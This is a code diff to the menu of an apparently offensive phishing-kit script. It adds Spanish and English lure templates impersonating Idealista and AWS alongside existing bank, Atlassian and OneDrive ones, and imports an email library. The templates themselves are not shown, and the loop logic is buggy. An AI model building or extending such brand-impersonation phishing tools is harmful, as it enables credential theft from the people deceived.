@@ -7,11 +7,13 @@ import smtplib
 from Templates.spanish.bankEs import BankEs
 from Templates.spanish.onedriveEs import onedrive_es
 from Templates.spanish.atalasianEs import AtalassianEs
+from Templates.spanish.buildingSellingEs import building_selling_es
 
 #Import templates English
 from Templates.english.bankEn import BankEn
 from Templates.english.onedriveEn import OneDriveEn
 from Templates.english.atalasianEn import AtalassianEn
+from Templates.english.awsEn import AwsEn
 
 #Import helpers
 from helper.helper import getPath,generateFolderReport,generateUrlAccess
@@ -25,9 +27,11 @@ def main():
     print("\n[1] Bank ")
     print("\n[2] Atalassian")
     print("\n[3] OneDrive")
-    print("\nSelect your option: \n")
+    print("\n[4] Idealista")
+    print
+    print("\n\nSelect your option: \n")
 
-    #Selaction of the lenguage of the attack
+    #Selection of the lenguage of the attack
     value=int(input())
     languageString="Choose language: \n[0]Spanish \n[1]English"+getPath()
 
@@ -49,7 +53,7 @@ def main():
                 #Template English
                 BankEn()
     #Atalassian
-    elif value ==2:
+    elif value == 2:
         print("\nAtalassian:\n"+languageString)
         language=int(input())
         while language!=0|language!=1:
@@ -61,7 +65,7 @@ def main():
                 AtalassianEn()
                 
     #Onedrive Template
-    elif value ==3:
+    elif value == 3:
         print("\nOneDrive:\n"+languageString)
         language=int(input())
         while language!=0|language!=1:
@@ -73,16 +77,30 @@ def main():
                 OneDriveEn()
 
     #
-    elif value ==4:
+    elif value == 4:
         print("\Idealista:\n"+languageString)
         language=int(input())
         while language!=0|language!=1:
             if language==0:
                 #Template Spanish
-                OneDriveEs()
+                building_selling_es()
             else:
                 #Template English
-
+                print("\nNot finish")
+                
+    elif value == 5:
+        print("\AWS:\n"+languageString)
+        language=int(input())
+        while language!=0|language!=1:
+            if language==0:
+                #Template Spanish
+                print("\nNot finish")
+            else:
+                #Template English
+                AwsEn()
+                
+                
+                
     #More Templates...
 
     else:
